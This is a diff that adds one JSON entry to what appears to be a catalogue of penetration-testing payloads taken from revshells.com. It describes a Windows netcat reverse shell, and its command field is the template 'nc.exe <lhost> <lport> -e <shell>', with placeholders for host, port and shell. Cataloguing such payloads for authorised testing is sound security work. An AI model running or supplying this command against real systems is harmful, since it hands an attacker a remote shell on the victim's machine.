@@ -1,0 +1,28 @@
+{
+  "id": "rsg-reverseshell-nc-exe-e",
+  "name": "RSG · ReverseShell · nc.exe -e",
+  "command": "nc.exe <lhost> <lport> -e <shell>",
+  "description": "Reverse Shell payload — nc.exe -e (via reverse-shell-generator).",
+  "platform": "windows",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "windows"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/nc.exe -e/7",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
